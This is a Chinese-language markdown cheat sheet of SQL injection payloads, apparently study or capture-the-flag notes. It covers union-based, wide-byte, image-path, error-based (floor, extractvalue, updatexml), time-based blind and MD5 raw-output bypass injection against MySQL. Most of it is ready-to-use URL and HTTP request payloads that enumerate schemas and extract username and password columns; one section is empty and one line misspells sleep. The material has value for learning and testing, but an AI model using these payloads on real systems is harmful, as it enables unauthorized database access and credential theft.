
# sql注入

* 常识
* 约束注入
* sql注入
* 宽字节注入
* 图片注入
* Mysql 报错注入
* 盲注
* head注入
* MD5绕过

## 常识
*  limit 条件
> limit 关键字后面还有 PROCEDURE 和 INTO 关键字，into 关键字可以用来写文件，但这在本文中不重要，这里的重点是 PROCEDURE 关键字.MySQL 默认可用的存储过程只有 ANALYSE (doc)。

```
//看版本
?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)%23
//数据库 mydbs 表
?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x3f,table_name,0x3f) from information_schema.tables where table_schema=0x6d79646273 limit 0,1))),1)%23
//读字段名
?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x3f,column_name,0x3f) from information_schema.columns where table_name=0x61727469636c65 and table_schema=0x6d79646273 limit 0,1))),1)%23
//读内容
?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x3f,username,0x3a,password,0x3f) from mydbs.user limit 2,1))),1)%23
```

## sql注入
``` 
?id=1 and 1=1  
?id=1 order by 10  
?id=1 union select 1,2,3  
// 获取数据库名，当前用户
?id=1 union select 1,database(),user()
// 获取数据库名
?id=1 union select 1,group_concat(SCHEMA_NAME),3 from information_schema.SCHEMATA
// 获取数据库表  
?id=1 union select 1,group_concat(TABLE_NAME),3 from information_schema.TABLES where TABLE_SCHEMA = 'mydbs'
// 根据获取的数据库表获取表名  
?id=1 union select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where TABLE_NAME = 'sae_user_sqli3'
// 获取表中的内容（也可以union 获取表中数据）  
?id=1 union select 1,group_concat(content),3 from sae_user_sqli3
```


## 约束注入
``` 

insert into user values('','admin                                  ','111');
```

## 宽字节注入

* 原理
> mysql的特性，mysql在使用gbk编码的时候，会认为两个字符是一个汉字（前一个ascii要大于128，菜刀汉字范围）  
> %df' and 1=1 %23

``` 
 ?id=3%df%27order by 3%23  
 ?id=3%df%27%20union%20select%201,2,3%23  
 ?id=3%df%27%20union%20select%201,user(),database()%23  
 ?id=3%df%27%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23    
 ?id=3%df%27%20union select 1,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7361655f757365725f73716c6934%20and%20table_schema=0x6d79646273%23    
 ?id=3%df%27%20union%20select%201,group_concat%28title_1%29,group_concat%28content_1%29%20from%20mydbs%2esae_user_sqli4%23  

```


## 图片注入

``` 
//报错
GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%bf' HTTP/1.1

//order by 5 报错，共有4个字段
GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20order%20by%205%23 HTTP/1.1

//看显示位，3
GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20union%20select%201,2,3,4%23 HTTP/1.1

//当前数据库 mydbs
GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20union%20select%201,2,database(),4%23 HTTP/1.1

//看表名 article pic
GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20union%20select%201,2,group_concat(table_name),4%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23 HTTP/1.1

//看字段 article表id,title,content,others  pic表id,picname,data,text
GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20union%20select%201,2,group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=0x61727469636c65%23 HTTP/1.1

//查看picname dog1.jpg,cat1.jpg,flagishere_askldjfklasjdfl.jpg
GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20union%20select%201,2,group_concat(picname),4%20from%20pic%23 HTTP/1.1
```


## MySQL报错注入

* 通过floor暴错
``` 
/*数据库版本*/
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/*简单办法暴库*/
?id=info()

/*连接用户*/
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/*连接数据库*/
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/*暴库*/
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/*暴表*/
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/*暴字段*/
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/*暴内容*/
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

* ExtractValue(有长度限制,最长32位)
```
?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))

?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
```

* UpdateXml(有长度限制,最长32位)
``` 
?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
```

* NAME_CONST(适用于低版本)
``` 
?id=330&sid=19&cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
```

* Error based Double Query Injection 
``` 
?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
```


## 盲注

``` 
// 判断是否存在盲注
?username=admin' and sleep(3) %23

select * from table where id = 1 and (if(substr(database(),1,1)=' ',selleep(4),null))
select * from table where id = 1 and (if(ascii(substr(database(),1,1))=100,selleep(4),null))

// benchmark
select benchmark(10000000000,sha(1))

// 笛卡尔积
select count(*) from information_schema.columns A, information_schema.columns B,information_schema.tables C;

// GET_LOCK
select GET_LOCK(' a', 1)


```

## head注入


## MD5绕过

> MD5("123456")------>e10adc3949ba59abbe56e057f20f883e        //正常的
  MD5("123456",ture)------>� �9I�Y��V�W���>    //出来的就是一堆乱码，（乱码可以绕过这里的查询）
  如果出来的乱码中有 'or' ，那么就可以直接使查询语句变为：  
      where usrid='XXX' and password='      '  or'  //垃圾'
``` 
?userid=1&pwd=ffifdyop
?userid=1&pwd=129581926211651571912466741651878684928
```
